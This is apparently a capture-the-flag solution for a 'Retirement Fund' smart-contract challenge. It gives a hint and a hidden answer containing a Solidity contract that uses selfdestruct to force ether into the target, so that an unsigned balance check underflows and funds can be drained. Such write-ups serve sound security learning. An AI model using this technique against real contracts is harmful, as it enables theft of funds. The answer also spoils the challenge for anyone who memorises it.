# Retirement Fund

**HINT:** Look at how ```startBalance``` is stored and the ```collectPenalty()`` function works
<details>
<summary>Answer</summary>
<p>

We pretty much abuse the use of uint256 and underflow it turning a negative balance into a positive
```
pragma solidity ^0.7.0;

contract FreeMoney {

    constructor(address payable target) payable {
        require(msg.value > 0);
        selfdestruct(target);
    }
}
```

</p>
</details>